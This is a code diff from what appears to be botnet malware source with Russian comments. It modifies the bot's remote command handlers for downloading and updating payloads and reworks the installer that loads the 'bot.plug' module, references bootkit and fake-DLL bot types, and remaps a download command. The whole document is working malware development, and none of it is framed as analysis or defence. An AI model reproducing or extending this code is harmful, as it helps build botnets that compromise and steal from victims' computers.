@@ -701,6 +701,7 @@ bool ExecuteDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 		return false;
 
 	PWCHAR FileName = GetTempName();
+	TASKDBG( "Download", "file: %ls, args: %s", FileName, Args );
 
 	if ( FileName)
 	{
@@ -750,22 +751,11 @@ bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
 	// Загрузить обновление
 	bool DeleteSettings = STRA::Hash(Args, 0, true) == 0x18766C /* all */;
 	#ifdef BOTPLUG
-		//  Для фэкедлл и буткита ссылку игнорируем, загружаем плагин
-		if (BOT::GetBotType() == BotFakeDll || BOT::GetBotType() == BotBootkit)
+		if( UpdateBotPlug() )
 		{
-			string PluginName = GetStr(EStrBotPlug);
-		    DWORD Size = 0;
-			LPBYTE Buf = Plugin::Download(PluginName.t_str(), NULL, &Size, true);
-			if (Buf)
-			{
-				if (DeleteSettings)
-					BOT::DeleteSettings();
-				bool Result = BOT::UpdateBotPlug(Buf, Size);
-				MemFree(Buf);
-				return Result;
-			}
+			if (DeleteSettings) BOT::DeleteSettings();
+			return true;
 		}
-
 		return false;
 	#else
 		PCHAR FileName = File::GetTempNameA();
@@ -979,15 +969,17 @@ DWORD WINAPI InstallBotPlug(const string *InstallerName)
 	TASKDBG("BotPlugInstaller", "Начинаем инсталяцию bot.plug инстялятором %s", InstallerName->t_str());
 
 	TPlugin Intaller(*InstallerName);
-	TPlugin Bot(GetStr(EStrBotPlug));
 
 	delete InstallerName;
 
-	// Загружаем плагины
-	if (!Intaller.Download(true) || !Bot.Download(false))
-		return FALSE;
+	void* dllBody;
+	DWORD dllSize;
+	if( !LoadBotPlug( &dllBody, &dllSize ) ) return FALSE;
 
-	TASKDBG("BotPlugInstaller", "Плагины успешно загружены, начинаем инсталцию");
+	// Загружаем плагин
+	if (!Intaller.Download(true)) return FALSE;
+
+	TASKDBG("BotPlugInstaller", "Плагин успешно загружен, начинаем инсталцию");
 
 	// Запускаем инсталяцию
 	typedef BOOL (WINAPI *TInstall)(BYTE* DllBody, DWORD DllSize);
@@ -996,11 +988,12 @@ DWORD WINAPI InstallBotPlug(const string *InstallerName)
 
 	TInstall Install;
 	if (Intaller.GetProcAddress(0x3E99511B /* Install */, (LPVOID&)Install))
-		Result = Install((LPBYTE)Bot.Data(), Bot.Size()) != FALSE;
+		Result = Install((LPBYTE)dllBody, dllSize) != FALSE;
 
 	if (Result)
 		TASKDBG("BotPlugInstaller", "Инсталяция успешно выполнена");
 
+	MemFree(dllBody);
 	return Result;
 
 }
@@ -1360,7 +1353,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 12: return ExecuteLF;
 		case 13: return ExecuteExec;
 		case 14: return ExecuteAddTrust;
-		case 15: return ExecuteDownload;
+		case 15: return ExecuteDownload2;
 
     default: ;
 	}
